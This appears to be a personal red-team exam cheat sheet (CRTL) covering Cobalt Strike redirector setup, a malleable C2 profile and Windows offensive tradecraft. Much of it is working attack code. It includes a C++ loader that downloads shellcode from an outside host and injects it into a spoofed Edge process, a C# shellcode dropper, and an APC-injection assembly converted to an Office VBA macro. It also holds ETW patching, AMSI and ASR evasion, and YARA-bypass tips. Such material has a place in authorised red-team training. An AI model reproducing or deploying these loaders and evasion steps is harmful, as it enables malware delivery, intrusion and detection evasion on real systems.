# CRTL
Category: CRTL

## C2 Infrastructure

### Apache

`sudo apt install apache2`
`sudo a2enmod ssl rewrite proxy proxy_http`

To use HTTPS :

`sudo rm sites-available/000-default.conf`
`sudo ln -s sites-available/default-ssl.conf .`
`sudo systemctl restart apache2`

### SSL certs

Private key -> `openssl genrsa -out <domain>.key 2048`
Certificate Signing Request (CSR) -> `openssl req -new -key <domain>.key -out <domain>.csr`

Create file with `<domain>.ext` :

```
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = <domain>.com
DNS.2 = www.<domain>.com
```

> We can more than 2 DNS entries in **[alt_names]**

Generate signed certificate -> `openssl x509 -req -in <csr_file>.csr -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial -out <domain>.crt -days 365 -sha256 -extfile <ext_file>.ext`
See details of certificate -> `openssl x509 -noout -text -in <certificate>.crt`

> Don't forget to copy the private key and public certificate to redirector :
> 
> sudo cp `domain.key` /etc/ssl/private/
> sudo cp `domain.crt` /etc/ssl/certs/

To use it with Apache, open `/etc/apache2/sites-enabled/default-ssl.conf` and look for lines 32-33 :
```
SSLCertificateFile         /etc/ssl/certs/public.crt
SSLCertificateKeyFile      /etc/ssl/private/private.key
```

`sudo systemctl restart apache2`

### Beacons certificates

`openssl req -x509 -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.crt -sha256 -days 365 -subj '/CN=localhost'`
`openssl pkcs12 -inkey localhost.key -in localhost.crt -export -out localhost.pfx`
`keytool -importkeystore -srckeystore localhost.pfx -srcstoretype pkcs12 -destkeystore localhost.store`

> Copy `localhost.store` to the teamserver.

C2 profile : 

```
https-certificate {
	set keystore "localhoste.store"
	set password "pass123"
}
```

Verify with : `curl -v -k https://[teamserver]`

### SSH tunnel

On teamserver : `ssh -N -R 8443:localhost:443 attacker@[redirector]`

> The command will just appear to freeze the terminal.

Verify on redirector : 
`sudo ss -ltnp`
`curl -v https://localhost:8443/r1`

On attacker : `scp localhost.crt attacker@[attacker]:/home/attacker`
On redirector :
```
sudo cp localhost.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

Verify on redirector : `curl -v -k https://[teamserver]`

To use autossh :

On teamserver : create `redirector-1` file at `.ssh/config` and add :
```
Host                  redirector-1
HostName              [redirector]
User                  attacker
Port                  22
IdentityFile          /home/attacker/.ssh/id_rsa
RemoteForward         8443 localhost:443
ServerAliveInterval   30
ServerAliveCountMax   3
```

On teamserver : `autossh -M 0 -f -N redirector-1`

### Enable Apache redirection

Modify `/etc/apache2/sites-enabled/default-ssl-conf` and under `<VirtualHost>` add :

```
<Directory /var/www/html>
	Options Indexes FollowSymLinks MultiViews
	AllowOverride All
	Require all granted
</Directory>
```

Add `SSLProxyEngine on` under `SSLEngine on`.
In `/var/www/html`, create `.htaccess` and add : 

```
RewriteEngine on
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

To verify with attacker machine : `curl https://<domain>/test`

> Can be tested with executing a beacon on victim machine.

A more complete `.htaccess` :

```
RewriteEngine on

# check beacon GET
RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteCond %{REQUEST_URI} __utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

# check beacon POST
RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ___utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

# if a,b,c,d and using wget or curl, change file to diversion
RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

# if file exists on redirector, show that file
RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

# if a,b,c,d and NOT using wget or curl, redirect to CS web server
RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

### Cookie rules

On C2 profile : 

```
metadata {
	netbios;
	prepend "SESSIONID=";
	header "Cookie";
}
```

### URI & query rules

Check `http-get` and `http-post` value from profile with : `c2lint c2-profiles/normal/webbug.profile`

> Values can be changed on profile file.
> Change value in `.htaccess` file to match with these.

### Beacon staging

Disable stagers on C2 profile : `set host_stage "false";`

### Redirecting DNS

On teamserver : `ssh attacker@[redirector-2] -R 5353:localhost:5353`
On the new ssh session : `sudo socat udp4-listen:53,reuseaddr,fork tcp:localhost:5353`
On teamserver : `sudo socat tcp-listen:5353,reuseaddr,fork udp4-sento:localhost:53`

To verify with `tcpdump` on `redirector-2` : `sudo tcpdump -i [interface] udp port 35`

### Payloads guardrails

A guardrail is one or more checks that a payload can make before it fully executes to prevent it from running outside of the target environment.

> Only applied to stageless payloads.

## Windows API

### WinAPI

`kernel32.dll` -> base services
`advapi32.dll` -> advanced services

Native API calls are implemented in `ntoskrnl.exe` and exposed to user mode via `ntdll.dll`.

For example with `NtOpenProcess` : `OpenProcess` in `kernel32.dll` calls `NtOpenProcess` in `ntdll.dll`.

The "A" functions use ANSI strings and "W" use Unicode (preferred).
`STARTUPINFOW` struct can provide some parameters for how the process should start and `PROCESS_INFORMATION` returns information about the new process (PID, ...).

To have more informations about error code : `net helpmsg [error_code]`

### Ordinals

We can use pestudio to see if imports are reported as malicious. If they are, we can use pe-bear to get ordinals of theses imports and convert it using `calc.exe`.
Then, we should precise `EntryPoint` and change the name of our function.

For example : 

```c++
# Before using ordinals
[DLLImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern bool CreateProcessW (
	...
);
```

```c++
# After using ordinals
[DLLImport("kernel32.dll", EntryPoint = "#233", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern bool TotalLegitApi (
	...
);
```

## Process injection

### Download shellcode in C++ & process injection (PPID & command line arguments spoofing)

```c++
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include "Native.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		NULL									// Replace "NULL" by "WINHTTP_FLAG_SECURE_DEFAULTS" when using HTTPS instead of HTTP
	);

	HINTERNET hConnect = WinHttpConnect(
		hSession,
		baseAddress,
		8000,									// Replace "[PORT]" by "INTERNET_DEFAULT_HTTPS_PORT" when using HTTPS instead of HTTP
		0
	);

	HINTERNET hRequest = WinHttpOpenRequest(
		hConnect,
		L"GET",
		filename,
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		NULL									// Replace "NULL" by "WINHTTP_FLAG_SECURE" when using HTTPS instead of HTTP
	);

	WinHttpSendRequest(
		hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0,
		WINHTTP_NO_REQUEST_DATA,
		0,
		0,
		0
	);

	WinHttpReceiveResponse(
		hRequest, 
		NULL
	);

	std::vector<BYTE> buffer;
	DWORD bytesRead = 0;

	do {
		BYTE temp[4096]{};
		WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

		if (bytesRead > 0) {
			buffer.insert(buffer.end(), temp, temp + bytesRead);
		}
	} while (bytesRead > 0);

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	return buffer;
}

int main() {

	LPSTARTUPINFOW startup_info = new STARTUPINFOW();
	startup_info->cb = sizeof(STARTUPINFOW);
	startup_info->dwFlags = STARTF_USESHOWWINDOW;

	const DWORD attributeCount = 1;
	LPSTARTUPINFOEX si = new STARTUPINFOEX();
	si->StartupInfo.cb = sizeof(STARTUPINFOEXW);

	SIZE_T lpSize = 0;
	InitializeProcThreadAttributeList(
		NULL,
		attributeCount,
		0,
		&lpSize
	);

	si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);
	InitializeProcThreadAttributeList(
		si->lpAttributeList,
		attributeCount,
		0,
		&lpSize
	);

	HANDLE hParent = OpenProcess(
		PROCESS_CREATE_PROCESS,
		FALSE,
		5196							// Hardcoded PID of process "explorer.exe"
	);

	UpdateProcThreadAttribute(
		si->lpAttributeList,
		NULL,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParent,
		sizeof(HANDLE),
		NULL,
		NULL
	);

	PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

	// Change this as fake args
	wchar_t fakeArgs[] = L"c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe\0";				

	// Change this as real application path
	LPCWSTR application = L"c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe\0";						

	BOOL success = CreateProcess(
		application,
		fakeArgs,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&si->StartupInfo,
		process_info
	);

	if (!success) {
		printf("[x] CreateProcess failed: %d\n", GetLastError());
		return 1;
	}

	printf("[*] PID: %d\n", process_info->dwProcessId);

	DeleteProcThreadAttributeList(si->lpAttributeList);
	free(si->lpAttributeList);

	CloseHandle(hParent);

	PPROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
	NtQueryInformationProcess(
		process_info->hProcess,
		ProcessBasicInformation,
		pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		NULL
	);

	PPEB peb = new PEB();
	SIZE_T bytesRead = 0;
	ReadProcessMemory(
		process_info->hProcess,
		pbi->PebBaseAddress,
		peb,
		sizeof(PEB),
		&bytesRead
	);

	PRTL_USER_PROCESS_PARAMETERS parameters = new RTL_USER_PROCESS_PARAMETERS();
	ReadProcessMemory(
		process_info->hProcess,
		peb->ProcessParameters,
		parameters,
		sizeof(RTL_USER_PROCESS_PARAMETERS),
		&bytesRead
	);

	auto szBuffer = parameters->CommandLine.Length;
	std::vector<BYTE> vector(szBuffer);
	RtlZeroMemory(&vector[0], szBuffer);
	WriteProcessMemory(
		process_info->hProcess,
		parameters->CommandLine.Buffer,
		&vector[0],
		szBuffer,
		NULL
	);

	// Change this with real arguments
	wchar_t realArgs[] = L"c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe\0";																	
	WriteProcessMemory(
		process_info->hProcess,
		parameters->CommandLine.Buffer,
		&realArgs,
		sizeof(realArgs),
		NULL
	);

	// Change IP adress (or domain name) and filename
	std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	HANDLE hSection;
	LARGE_INTEGER szSection = { shellcode.size() };

	NTSTATUS status = ntCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&szSection,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	);

	if (!NT_SUCCESS(status)) {
		printf("[x] NtCreateSection failed: 0x%X\n", status);
		return 1;
	}

	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE
	);

	RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

	PVOID hRemoteAddress = NULL;
	status = ntMapViewOfSection(
		hSection,
		process_info->hProcess,
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE
	);

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(process_info->hThread, pContext);

	pContext->Rcx = (DWORD64)hRemoteAddress;
	SetThreadContext(process_info->hThread, pContext);

	ResumeThread(process_info->hThread);
	
	CloseHandle(process_info->hThread);
	CloseHandle(process_info->hProcess);

	status = ntUnmapViewOfSection(
		GetCurrentProcess(),
		hLocalAddress
	);
}
```

File `Native.h` : 

```c++
#pragma once

#include <windows.h>
#include <winternl.h>

using NtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL PLARGE_INTEGER MaximumSize,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
	IN OUT PSIZE_T ViewSize,
	IN DWORD InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect);

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL);

typedef enum _SECTION_INHERIT : DWORD {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
```
### Download files in CSharp, create thread and execute

> Must check `Allow unsafe code` in project properties.

```c#
using Microsoft.VisualBasic;
using System.Runtime.InteropServices;

namespace FirstDropper
{
    internal class Dropper {

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MEMORY_PROTECTION flNewProtect,
            out MEMORY_PROTECTION lpflOldProtect
        );

        enum MEMORY_PROTECTION : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        public static async Task Main(string[] args)
        {
            byte[] shellcode;

            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://192.168.65.129:8000");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");

                unsafe
                {
                    fixed (byte* ptr = shellcode)
                    {
                        VirtualProtect(ptr, (uint)shellcode.Length, MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE, out _);

                        var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);

                        var thread = new Thread(new ThreadStart(beacon));
                        thread.Start();

                        Console.WriteLine("[*] Shellcode is running, press any key to exit.");
                        Console.ReadKey();
                    }
                }
            }
        }
    }
}
```

## Defence Evasion

### Process injection kit

Execute : 
1. `mkdir /mnt/c/Tools/cobaltstrike/custom-injection`
2. `cd /mnt/c/Tools/cobaltstrike/arsenal-kits/kits/process_inject`
3. `./build.sh /mnt/c/Tools/cobaltstrike/custom-injection`

### Event Tracing for Windows

Create a file named `powerpick-patched.cna` and add :

```
# $1 - the id for the beacon
# $2 - the cmdlet and arguments
# $3 - [optional] if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command
# $4 - [optional] PATCHES

alias powerpick-patched {
	bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C300");
}
```

Create a file named `execute-assembly-patched.cna` and add :

```
# $1 - the id for the beacon
# $2 - the local path to the .NET executable assembly
# $3 - parameters to pass to the assembly
# $4 - [optional] PATCHES

alias execute-assembly-patched {
	bexecute_assembly($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C300");
}
```

## Attack Surface Reduction (ASR)

### Enumeration

> Available only if `Defender` is the primary AV.

Check if ASR is enabled :
cmd -> `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\ExploitGuard_ASR_Rules"`
beacon -> `reg queryv x64 HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR ExploitGuard_ASR_Rules`

Registry -> `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR`
With Powershell -> `(Get-MpPreference).AttackSurfaceReductionRules_Ids`
Check values (`0` -> `disabled`, `1` -> `block`, `2` -> `audit`) -> `(Get-MpPreference).AttackSurfaceReductionRules_Actions`

### Reversing ASR Exclusions

Copy current VDM file : `cp /mnt/c/ProgramData/Microsoft/Windows\ Defender/Definition\ Updates/Backup/mpasbase.vdm .`
Extract content : `python3 wd-extract.py mpasbase.vdm --decompile wd-extracted`

> Don't forget to grab a coffee !!

Search ASR rule, for example : `grep "Block all Office applications from creating child processes" *.lua`
Open file : `code [file].lua`
### GadgetToJScript

With VS, open `GadgetToJScript` at `C:\Tools\GadgetToJScript`. Modify `TestAssembly/Program.cs` with :

```c#
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace TestAssembly{
    public class Program{
        public Program(){
            byte[] shellcode;

            using (var client = new WebClient())
            {
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

                shellcode = client.DownloadData("https://www.infinity-bank.com/shellcode.bin"); // Don't forget to modify these values !!
            };

            STARTUPINFO startup = new STARTUPINFO();
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            var success = CreateProcess(
                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                @"C:\Program Files (x86)\Microsoft\Edge\Application",
                ref startup,
                out processInfo
            );

            IntPtr address = VirtualAllocEx(
                processInfo.hProcess,
                IntPtr.Zero,
                shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            IntPtr bytesWritten = IntPtr.Zero;
            success = WriteProcessMemory(
                processInfo.hProcess,
                address,
                shellcode,
                shellcode.Length,
                out bytesWritten
            );

            uint oldProtect = 0;
            success = VirtualProtectEx(
                processInfo.hProcess,
                address,
                shellcode.Length,
                PAGE_EXECUTE_READ,
                out oldProtect
            );

            IntPtr thread = OpenThread(
                ThreadAccess.SET_CONTEXT,
                false,
                (int)processInfo.dwThreadId
            );

            _ = QueueUserAPC(
                address,
                thread,
                IntPtr.Zero
            );

            ResumeThread(processInfo.hThread);
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 MEM_RESERVE = 0x2000;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [Flags]
        public enum CREATION_FLAGS : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = 0x0001,
            SUSPEND_RESUME = 0x0002,
            GET_CONTEXT = 0x0008,
            SET_CONTEXT = 0x0010,
            SET_INFORMATION = 0x0020,
            QUERY_INFORMATION = 0x0040,
            SET_THREAD_TOKEN = 0x0080,
            IMPERSONATE = 0x0100,
            DIRECT_IMPERSONATION = 0x0200
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);
    }
}
```

Build the solution in `Release` mode and use `GadgetToJScript.exe` to generate VBA payload : 

Powershell : `PS C:\Tools\GadgetToJScript .\GadgetToJScript\bin\Release\GadgetToJScript.exe -w vba -b -e hex -o C:\Payloads\inject -a .\TestAssembly\bin\Release\TestAssembly.dll`

Copy / paste content of `C:\Payloads\Inject.vba` to Office document with macro (for example -> `test.doc`). 

```vb
Sub macron()

    Exec
    
End Sub

Private Function hexDecode(hex)
    On Error Resume Next
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Microsoft.XMLDOM")
    Set nodeObj = xmlObj.createElement("tmp")
    nodeObj.DataType = "bin.hex"
    nodeObj.Text = hex
    hexDecode = nodeObj.NodeTypedValue
End Function

Function Exec()
    Dim stage_1, stage_2

	[....]

    MsgBox "No it's not a malware ;)"

End Function

```

## Appendices

### Tips & Tricks

#### Start of the exam

1. Import custom C2 profile
2. Create listeners : http(s), smb, tcp (port 4444) and tcp-local (port 4444) + check `Bind to localhost only`
3. Generate all stageless payloads
4. Host `http(s)_x64.xprocess.bin`
5. Don't forget to modify code of third-party tool (like `Rubeus`, `SharpUp`, etc.) to bypass `YARA rules` (`CTRL + Shift + H` in VS to verify occurences and replace)
6. Drop the `dropper` and start hacking

#### SMB Listener

To have a OPSEC-friendly pipename, list all currently pipes with : `PS C:\> ls \\.\pipe\`

#### Upload dropper on target

1. Compile dropper with custom args to match with target machine
2. Create a folder with :
	1. Dropper compiled
	2. `msvcp140d.dll`
	3. `ucrtbased.dll`
	4. `vcruntime140d.dll`
	5. `vcruntime140_1.dll`
3. Compress the folder to `ZIP` format
4. Host it with CS and request from target machine to download it

#### Error execute-assembly `[-] Failed to load the assembly w/hr 0x8007000b`

Several possible causes :
* The achitecture of the binary is not identical to the beacon / target machine -> recompile the tool in `x64`
* `AMSI` prevents execution -> use `inlineExecute-assembly` with args like : `inlineExecute-Assembly --dotnetassembly [tool] --assemblyargs [tool_args] --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337`

### C2 Profile (WIP)

> Check that the `spawnto` application is compatible with the dropper application. By default, use `msedge.exe`

> For modifications, use spaces and not tabs.

```
set tasks_max_size "2097152";
set host_stage "false";
set sleeptime "1000";

http-get {
    set uri "/__utm.gif";
    client {
        parameter "utmac" "UA-2202604-2";
        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";

        metadata {
            netbios;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "image/gif";

        output {
            # hexdump pixel.gif
            # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
            # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
            # 0000020 01 00 01 00 00 02 01 44 00 3b

            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

            print;
        }
    }
}

http-post {
    set uri "/___utm.gif";
    client {
        header "Content-Type" "application/octet-stream";

        id {
            prepend "UA-220";
            append "-2";
            parameter "utmac";
        }

        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1280x1024";
        parameter "utmsc" "32-bit";
        parameter "utmul" "en-US";

        output {
            print;
        }
   }

   server {
       header "Content-Type" "image/gif";

       output {
           prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
           prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
           prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
           print;
       }
    }
}

https-certificate {
    set keystore "localhost.store";
    set password "pass123";
}

stage {
    set userwx "false";
    set cleanup "true";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set bof_reuse_memory "false";
}

post-ex {
    set obfuscate "true";
    set cleanup "true";

    set spawnto_x86 "c:\\windows\\syswow64\\cmd.exe";
    set spawnto_x64 "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe";

    set pipename "TSVCPIPE-########-####-####-####-############";
}
```
